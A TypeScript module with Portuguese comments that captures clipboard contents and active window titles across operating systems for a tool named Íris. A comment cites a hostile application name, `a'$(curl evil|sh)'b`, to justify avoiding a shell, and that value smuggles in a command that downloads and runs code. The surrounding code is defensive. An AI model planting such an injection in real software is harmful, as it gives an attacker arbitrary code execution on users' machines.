/**
 * Captura de contexto, por sistema operacional.
 *
 * Duas fontes, e só duas:
 *   - área de transferência (o que você copia)
 *   - título da janela ativa (em que você está trabalhando)
 *
 * Não há captura de tela, nem de teclas digitadas. Isso é decisão de projeto,
 * não limitação técnica: um registrador de teclas capturaria a sua senha ao
 * digitá-la, e nenhuma filtragem posterior conserta isso. O que ele já escreveu
 * em disco, escreveu.
 *
 * Cada sistema precisa de uma ferramenta externa, e quando ela falta o
 * observador diz qual é em vez de ficar em silêncio.
 */
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { createLogger } from '../util/logger.js';

/*
 * `execFile`, nunca `exec`.
 *
 * O observador interpola valores que não controla: o nome do processo em foco
 * no macOS e o id da janela ativa no X11 — este último é uma propriedade que
 * qualquer cliente X na mesma sessão consegue escrever. Com `exec` esses
 * valores passariam por /bin/sh, e um aplicativo chamado
 * `a'$(curl evil|sh)'b` executaria comando arbitrário a cada 2,5 segundos.
 * Com `execFile` e argumentos em vetor, não existe shell para interpretar nada.
 */
const execFileAsync = promisify(execFile);
const log = createLogger('observador');

export interface Captura {
  clipboard: string | null;
  janela: string | null;
}

export interface Disponibilidade {
  clipboard: boolean;
  janela: boolean;
  /** O que instalar, quando faltar. */
  faltando: string[];
}

/** Executa um programa com argumentos em vetor. Nenhum shell no caminho. */
async function rodar(programa: string, args: string[], timeoutMs = 3000): Promise<string | null> {
  try {
    const { stdout } = await execFileAsync(programa, args, {
      timeout: timeoutMs,
      maxBuffer: 2 * 1024 * 1024,
      encoding: 'utf8',
    });
    return stdout;
  } catch {
    return null;
  }
}

async function existe(programa: string): Promise<boolean> {
  return process.platform === 'win32'
    ? (await rodar('where', [programa], 2000)) !== null
    : (await rodar('command', ['-v', programa], 2000)) !== null ||
        (await rodar('which', [programa], 2000)) !== null;
}

// ── área de transferência ────────────────────────────────────────────────────

export async function lerClipboard(): Promise<string | null> {
  switch (process.platform) {
    case 'darwin':
      return rodar('pbpaste', []);

    case 'win32':
      return rodar(
        'powershell',
        ['-NoProfile', '-NonInteractive', '-Command', 'Get-Clipboard -Raw'],
        5000,
      );

    default: {
      // Wayland primeiro: em sessão Wayland o xclip devolve vazio em silêncio.
      if (process.env.WAYLAND_DISPLAY) {
        const wl = await rodar('wl-paste', ['--no-newline']);
        if (wl !== null) return wl;
      }
      const xclip = await rodar('xclip', ['-selection', 'clipboard', '-o']);
      if (xclip !== null) return xclip;
      return rodar('xsel', ['--clipboard', '--output']);
    }
  }
}

// ── janela ativa ─────────────────────────────────────────────────────────────

export async function lerJanelaAtiva(): Promise<string | null> {
  switch (process.platform) {
    case 'darwin': {
      const app = await rodar(
        'osascript',
        [
          '-e',
          'tell application "System Events" to get name of first application process whose frontmost is true',
        ],
        4000,
      );
      if (!app?.trim()) return null;
      const nomeApp = app.trim();

      /*
       * O nome do aplicativo entra num script AppleScript, e nome de aplicativo
       * é escolhido por quem empacota o aplicativo. Aspas e barras invertidas
       * são escapadas antes de compor o script; o `execFile` já garante que
       * nada disso chegue a um shell.
       */
      const nomeEscapado = nomeApp.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
      const titulo = await rodar(
        'osascript',
        [
          '-e',
          `tell application "System Events" to tell process "${nomeEscapado}" to get title of front window`,
        ],
        4000,
      );
      return titulo?.trim() ? `${nomeApp} — ${titulo.trim()}` : nomeApp;
    }

    case 'win32':
      return rodar(
        'powershell',
        [
          '-NoProfile',
          '-NonInteractive',
          '-Command',
          'Add-Type -AssemblyName System.Windows.Forms; ' +
            '$p = Get-Process | Where-Object { $_.MainWindowHandle -ne 0 -and $_.MainWindowTitle } | ' +
            'Select-Object -First 1; if ($p) { "$($p.ProcessName) - $($p.MainWindowTitle)" }',
        ],
        6000,
      );

    default: {
      const xdotool = await rodar('xdotool', ['getactivewindow', 'getwindowname']);
      if (xdotool !== null) return xdotool;

      // Alternativa sem xdotool. O pipe para `awk` saiu junto com o shell: a
      // saída do xprop é interpretada aqui mesmo.
      const raiz = await rodar('xprop', ['-root', '_NET_ACTIVE_WINDOW']);
      const janelaId = extrairIdDeJanela(raiz);
      if (!janelaId) return null;

      const nome = await rodar('xprop', ['-id', janelaId, 'WM_NAME']);
      const m = nome ? /"(.*)"/.exec(nome) : null;
      return m?.[1] ?? null;
    }
  }
}

/**
 * Extrai o id da janela ativa da saída do xprop.
 *
 * O formato exigido (`0x` seguido de hexadecimal) é validado, não só extraído:
 * essa propriedade da janela raiz é gravável por qualquer cliente X na mesma
 * sessão, então o valor é entrada não confiável.
 */
export function extrairIdDeJanela(saidaXprop: string | null): string | null {
  if (!saidaXprop) return null;
  const m = /\b(0x[0-9a-fA-F]+)\b/.exec(saidaXprop);
  if (!m) return null;
  const id = m[1]!;
  if (/^0x0+$/.test(id)) return null; // nenhuma janela em foco
  return id;
}

export async function capturar(): Promise<Captura> {
  const [clipboard, janela] = await Promise.all([lerClipboard(), lerJanelaAtiva()]);
  return {
    clipboard: clipboard?.trim() ? clipboard : null,
    janela: janela?.trim() ? janela.trim() : null,
  };
}

// ── diagnóstico ──────────────────────────────────────────────────────────────

export async function verificarDisponibilidade(): Promise<Disponibilidade> {
  const faltando: string[] = [];

  if (process.platform === 'linux') {
    const wayland = Boolean(process.env.WAYLAND_DISPLAY);
    const temClipboard = wayland
      ? await existe('wl-paste')
      : (await existe('xclip')) || (await existe('xsel'));
    const temJanela = wayland ? false : (await existe('xdotool')) || (await existe('xprop'));

    if (!temClipboard) {
      faltando.push(
        wayland ? 'wl-clipboard (sudo apt install wl-clipboard)' : 'xclip (sudo apt install xclip)',
      );
    }
    if (!temJanela) {
      faltando.push(
        wayland
          ? 'leitura de janela ativa não é possível no Wayland por decisão do próprio protocolo — ' +
              'só a área de transferência funciona aqui'
          : 'xdotool (sudo apt install xdotool)',
      );
    }
    return { clipboard: temClipboard, janela: temJanela, faltando };
  }

  if (process.platform === 'darwin') {
    // O macOS pede permissão de Acessibilidade para ler o título da janela.
    const janela = (await lerJanelaAtiva()) !== null;
    if (!janela) {
      faltando.push(
        'permissão de Acessibilidade em Ajustes → Privacidade e Segurança → Acessibilidade, ' +
          'para o terminal onde a Íris roda',
      );
    }
    return { clipboard: true, janela, faltando };
  }

  return { clipboard: true, janela: true, faltando };
}

export function descreverPlataforma(): string {
  switch (process.platform) {
    case 'darwin':
      return 'macOS (pbpaste + AppleScript)';
    case 'win32':
      return 'Windows (PowerShell)';
    case 'linux':
      return process.env.WAYLAND_DISPLAY ? 'Linux/Wayland (wl-paste)' : 'Linux/X11 (xclip + xdotool)';
    default:
      return process.platform;
  }
}

export { log as logObservador };
